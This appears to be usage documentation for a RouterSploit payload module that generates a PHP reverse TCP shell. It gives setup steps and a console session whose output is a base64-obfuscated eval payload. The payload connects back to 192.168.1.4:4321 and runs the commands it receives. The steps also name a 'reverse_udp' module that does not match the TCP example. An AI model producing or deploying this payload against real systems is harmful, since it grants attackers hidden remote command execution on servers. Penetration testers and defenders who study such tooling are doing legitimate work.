## Description

Module generates payload that creates interactive tcp reverse shell by using php. 

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/php/reverse_udp`
  3. Do: `set lhost 192.168.1.4`
  3. Do: `set lport 4321`
  4. Do: `run`
  5. Module generates php tcp reverse shell payload

## Scenarios

```
rsf > use payloads/php/reverse_tcp
rsf (PHP Reverse TCP) > set lhost 192.168.1.4
[+] lhost => 192.168.1.4
rsf (PHP Reverse TCP) > set lport 4321
[+] lport => 4321
rsf (PHP Reverse TCP) > run
[*] Running module...
[*] Generating payload
eval(base64_decode('JHM9ZnNvY2tvcGVuKCJ0Y3A6Ly8xOTIuMTY4LjEuNCIsNDMyMSk7d2hpbGUoIWZlb2YoJHMpKXtleGVjKGZnZXRzKCRzKSwkbyk7JG89aW1wbG9kZSgiXG4iLCRvKTskby49IlxuIjtmcHV0cygkcywkbyk7fQ=='));
```
